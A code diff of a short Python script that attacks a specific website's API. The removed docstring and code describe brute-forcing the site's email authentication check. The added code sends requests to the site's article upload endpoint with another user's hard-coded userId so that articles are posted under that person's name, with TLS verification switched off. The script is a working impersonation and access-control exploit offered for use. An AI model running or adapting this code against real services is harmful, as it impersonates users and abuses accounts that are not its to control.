@@ -1,8 +1,5 @@
 '''
-F88K email authentication.
-
-Brute force for validation, you may not pass the validation if your device cannot send enough request.
-Ajust the threads number, the email and userId.
+Use other's name to post the article
 '''
 
 
@@ -10,11 +7,15 @@ import json
 import threading
 import requests
 
-email = 'EXAMPLE'
-userId = 'DB84875CB77E10386BC4C6EA60D5E60E'
+userId = '25A4CBAC10263CBCB61708156D0A57DE'
+title = ''
+content = '''
+
+
+'''
 
 requests.packages.urllib3.disable_warnings()
-base_url = "https://www.jumboxtech.com:8022/user/queryUser"
+base_url = "https://www.jumboxtech.com:8022/article/uploadArticle"
 header = {
     'Host': 'www.jumboxtech.com:8022',
     'Connection': 'keep-alive',
@@ -28,7 +29,7 @@ header = {
 
 s = requests.session()
 s.keep_alive = False
-payload = f'userId={userId}'
+payload = f'userId={userId}&articleTag=&articleTitle={title}&articleContent={content}'
 req = s.post(base_url, headers=header, data=payload, verify=False)
 ob = json.loads(req.content.decode(encoding='utf-8'))
 print(req.content.decode(encoding='utf-8'))
